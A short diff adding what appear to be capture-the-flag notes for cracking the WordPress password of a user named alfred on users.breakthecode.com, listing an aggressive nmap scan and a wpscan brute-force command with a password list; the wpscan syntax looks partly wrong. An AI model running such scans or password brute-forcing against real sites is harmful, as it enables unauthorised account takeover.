@@ -1,0 +1,9 @@
+website: users.breakthecode.com
+clue: alfred's password is changed and admin's password changed too, to reset the alfred's password.
+task:  get alfred's password.
+
+procedure: 
+1. nmap -A -T5 users.breakthecode.com 
+the website uses wordpress site 
+
+2. wpscan -u "users.breakthecode.com" -u alfred -p <passwords.txt> 
